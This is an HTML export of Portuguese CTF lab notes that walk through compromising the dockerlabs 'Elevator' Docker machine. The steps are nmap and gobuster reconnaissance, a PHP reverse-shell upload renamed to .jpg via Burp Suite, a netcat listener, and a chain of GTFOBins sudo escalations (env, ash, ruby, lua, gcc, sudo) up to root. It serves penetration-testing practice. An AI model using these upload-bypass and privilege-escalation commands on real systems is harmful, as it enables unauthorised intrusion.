<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>maq.elevator</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>maq.elevator</h1><br/><p></p><p><strong><span style="color:#ff0000;">MÁQUINA ELEVATOR</span></strong></p><p></p><p><img src="images/233-1.png" alt="images/233-1.png" /></p><p></p><p><strong>Para utilizar esta máquina devemos primeiro baixar os arquivos e assim implantá-la com Docker.</strong><strong></strong></p><p><strong>  </strong><strong></strong></p><p><strong>Baixamos o arquivo da página </strong><strong><a href="https://dockerlabs.es/">https://dockerlabs.es/</a></strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>Para implantar o laboratório executamos da seguinte forma, para que também possamos ver que ele nos diz a direção que teremos, bem como o que fazer quando terminarmos.</strong></p><p></p><p><img src="images/233-2.png" alt="images/233-2.png" /></p><p></p><p><strong><span style="color:#ff0000;">COLETA DE INFORMAÇÕES </span></strong></p><p></p><p><strong><span style="color:#ff7800;">nmap 172.17.0.2 -A -sS -sC -sV -Pn -p- -T5 </span></strong></p><p></p><p><strong>Temos porta 80 aberta:</strong></p><p></p><p><img src="images/233-3.png" alt="images/233-3.png" /></p><p></p><p><strong>Vamos fazer um </strong><strong><span style="color:#ff7800;">fuzzing </span></strong><strong>para ver se tem pastas ocultas, com a ferramenta </strong><strong><span style="color:#ff7800;">gobuster</span></strong><strong>.</strong></p><p></p><p><strong>gobuster dir -u </strong><strong><a href="http://172.17.0.2">http://172.17.0.2</a></strong><strong> -w /usr/share/seclists/Discovery/Web-Content/big.txt</strong></p><p></p><p><img src="images/233-4.png" alt="images/233-4.png" /></p><p></p><p><strong><span style="color:#ff7800;">gobuster dir -u </span></strong><strong><a href="http://172.17.0.2/themes">http://172.17.0.2/themes</a></strong><strong><span style="color:#ff7800;"> -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x .php,.txt,.html </span></strong><strong><span style="color:#3584e4;">--exclude-length </span></strong><strong><span style="color:#ff7800;">275 -t 64  </span></strong></p><p></p><p><img src="images/233-5.png" alt="images/233-5.png" /></p><p></p><p><strong>Vamos explorar a porta 80</strong>: <strong><a href="http://172.17.0.2/">http://172.17.0.2/</a></strong></p><p></p><p><img src="images/233-6.png" alt="images/233-6.png" /></p><p></p><p><strong>Podemos subir um arquivo malicioso com reverse shell.</strong> <strong><a href="http://172.17.0.2/themes/archivo.html">http://172.17.0.2/themes/archivo.html</a></strong></p><p></p><p><img src="images/233-7.png" alt="images/233-7.png" /></p><p></p><p><strong>Vamos subir um arquivo malicioso em </strong><strong><span style="color:#ff7800;">php</span></strong><strong> com reverse shell, e interceptar com </strong><strong><span style="color:#ff7800;">burp suite</span></strong><strong> e mudar o nome do arquivo para </strong><strong><span style="color:#ff7800;">.jpg</span></strong><strong>.</strong> <strong>site para pegar a reverse shell </strong><strong><a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a></strong></p><p></p><p><img src="images/233-8.png" alt="images/233-8.png" /></p><p></p><p><strong>Veja que o arquivo subiu com sucesso, agora vamos mandar o arquivo para o site e deixar o </strong><strong><span style="color:#ff7800;">netcat</span></strong><strong> ativo na porta configurada.</strong></p><p></p><p><img src="images/233-9.png" alt="images/233-9.png" /></p><p></p><p><img src="images/233-10.png" alt="images/233-10.png" /></p><p></p><p><strong>Temos a reverse shell.</strong></p><p></p><p><img src="images/233-11.png" alt="images/233-11.png" /></p><p></p><p><strong>Agora vamos procurar por escalação de privilégios </strong><strong><span style="color:#ff7800;">sudo -l</span></strong><strong> .</strong></p><p></p><p><strong>Com base no resultado do comando </strong><strong><code>sudo -l</code></strong><strong>, temos permissão para executar o comando </strong><strong><code>/usr/bin/env</code></strong><strong> como o usuário </strong><strong><code>daphne</code></strong><strong> sem precisar de senha. Isso pode ser explorado para escalar privilégios.</strong></p><p></p><p><img src="images/233-12.png" alt="images/233-12.png" /></p><p></p><p><strong>Vamos para o site para pesquisar por escalação de privilégios</strong><strong><span style="color:#ff7800;"> env</span></strong><strong>. </strong><strong><a href="https://gtfobins.github.io/gtfobins/env/#sudo">https://gtfobins.github.io/gtfobins/env/#sudo</a></strong></p><p></p><p><img src="images/233-13.png" alt="images/233-13.png" /></p><p></p><p><strong>Somos usuário </strong><strong><span style="color:#ff7800;">Daphne</span></strong><strong>. Novamente vamos da o comando </strong><strong><span style="color:#ff7800;">sudo -l</span></strong><strong>.</strong></p><p></p><p><strong><span style="color:#ff7800;">sudo -u daphne /usr/bin/env /bin/bash </span></strong></p><p></p><p><img src="images/233-14.png" alt="images/233-14.png" /></p><p></p><p><strong><span style="color:#ff7800;">sudo -l</span></strong></p><p></p><p><strong>Agora que você tem acesso como o usuário </strong><strong><code>daphne</code></strong><strong>, perceba que este pode executar o comando </strong><strong><code>/usr/bin/ash</code></strong><strong> como o usuário </strong><strong><code>vilma</code></strong><strong> sem senha. Isso pode ser usado para escalar privilégios mais uma vez.</strong></p><p></p><p><img src="images/233-15.png" alt="images/233-15.png" /></p><p></p><p><strong>Vamos para o site para pesquisar por escalação de privilégios</strong> <strong><span style="color:#ff7800;">ash</span></strong><strong>.</strong> <strong><a href="https://gtfobins.github.io/gtfobins/ash/#sudo">https://gtfobins.github.io/gtfobins/ash/#sudo</a></strong></p><p></p><p><img src="images/233-16.png" alt="images/233-16.png" /></p><p></p><p><strong>Somos usuário Vilma.</strong> </p><p></p><p><strong><span style="color:#ff7800;">sudo -u vilma /usr/bin/ash</span></strong></p><p></p><p><img src="images/233-17.png" alt="images/233-17.png" /></p><p></p><p><strong>Novamente </strong><strong><span style="color:#ff7800;">sudo -l </span></strong> <strong>para procurar privilégios.</strong></p><p></p><p><strong>Agora que você tem acesso como o usuário </strong><strong><code>vilma</code></strong><strong>, percebe que ele pode executar o comando </strong><strong><code>/usr/bin/ruby</code></strong><strong> como o usuário </strong><strong><code>shaggy</code></strong><strong> sem senha. O Ruby pode ser usado para escalar privilégios para </strong><strong><code>shaggy</code></strong><strong>.</strong></p><p></p><p><img src="images/233-18.png" alt="images/233-18.png" /></p><p></p><p><strong>Vamos para o site para pesquisar por escalação de privilégios</strong> <strong><span style="color:#ff7800;">ruby</span></strong><strong>. </strong><strong><a href="https://gtfobins.github.io/gtfobins/ruby/#sudo">https://gtfobins.github.io/gtfobins/ruby/#sudo</a></strong> .</p><p></p><p><img src="images/233-19.png" alt="images/233-19.png" /></p><p></p><p><strong>Somos o usuário </strong><strong><span style="color:#ff7800;">Shaggy</span></strong><strong>.</strong></p><p></p><p><strong><span style="color:#ff7800;">sudo -u shaggy /usr/bin/ruby -e &#39;exec &quot;/bin/bash&quot; &#39;</span></strong></p><p></p><p><img src="images/233-20.png" alt="images/233-20.png" /></p><p></p><p><strong>Novamente </strong><strong><span style="color:#ff7800;">sudo -l </span></strong><strong>para buscar por privilégios.</strong></p><p></p><p><strong>Com o acesso ao usuário </strong><strong><code>shaggy</code></strong><strong>, percebemos que ele pode executar o comando </strong><strong><code>/usr/bin/lua</code></strong><strong> como o usuário </strong><strong><code>fred</code></strong><strong> sem senha. A Lua pode ser explorada para escalar privilégios para </strong><strong><code>fred</code></strong><strong>.</strong></p><p></p><p><img src="images/233-21.png" alt="images/233-21.png" /></p><p></p><p><strong>Vamos para o site para pesquisar por escalação de privilégios</strong> <strong><span style="color:#ff7800;">lua</span></strong><strong>. </strong><strong><a href="https://gtfobins.github.io/gtfobins/lua/#sudo">https://gtfobins.github.io/gtfobins/lua/#sudo</a></strong> .</p><p></p><p><img src="images/233-22.png" alt="images/233-22.png" /></p><p></p><p><strong>Somos usuário Fred.</strong></p><p></p><p><strong><span style="color:#ff7800;">sudo -u fred /usr/bin/lua -e &#39;os.execute(&quot;/bin/bash&quot;)&#39;</span></strong></p><p></p><p><img src="images/233-23.png" alt="images/233-23.png" /></p><p></p><p><strong><span style="color:#ff7800;">sudo -l</span></strong><strong> novamente.</strong></p><p></p><p><strong>Agora que você tem acesso como o usuário </strong><strong><code>fred</code></strong><strong>, percebemos que ele pode executar o comando </strong><strong><code>/usr/bin/gcc</code></strong><strong> como o usuário </strong><strong><code>scooby</code></strong><strong> sem senha.</strong></p><p></p><p><img src="images/233-24.png" alt="images/233-24.png" /></p><p></p><p><strong>Vamos para o site para pesquisar por escalação de privilégios</strong> <strong><span style="color:#ff7800;">gcc</span></strong><strong>.  </strong><strong><a href="https://gtfobins.github.io/gtfobins/gcc/#sudo">https://gtfobins.github.io/gtfobins/gcc/#sudo</a></strong></p><p><code></code></p><p><code></code><img src="images/233-25.png" alt="images/233-25.png" /></p><p></p><p><strong>Somos usuário Scooby.</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong></strong><strong><span style="color:#ff7800;">&quot;sudo -u scooby /usr/bin/gcc -wrapper /bin/bash,-s .&quot;</span></strong></p><p></p><p><img src="images/233-26.png" alt="images/233-26.png" /></p><p></p><p><strong><span style="color:#ff7800;">sudo -l</span></strong><strong> novamente.</strong></p><p></p><p><strong>O usuário </strong><strong><code>scooby</code></strong><strong> tem permissão para executar o comando </strong><strong><code>/usr/bin/sudo</code></strong><strong> como </strong><strong><code>root</code></strong><strong> sem senha. Isso significa que você pode obter um shell com privilégios </strong><strong><code>root</code></strong><strong> diretos.</strong></p><p></p><p><img src="images/233-27.png" alt="images/233-27.png" /></p><p></p><p><strong>Vamos para o site para pesquisar por escalação de privilégios</strong> <strong><span style="color:#ff7800;">sudo</span></strong>. </p><p></p><p><img src="images/233-28.png" alt="images/233-28.png" /></p><p></p><p><strong><span style="color:#ff7800;">sudo sudo /bin/bash</span></strong></p><p></p><p><img src="images/233-29.png" alt="images/233-29.png" /></p><p></p><p><strong><span style="color:#ff7800;">Somos root</span></strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong></strong><strong><span style="color:#ff0000;text-decoration:line-through;">R10</span></strong></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p></div>
</body>
</html>
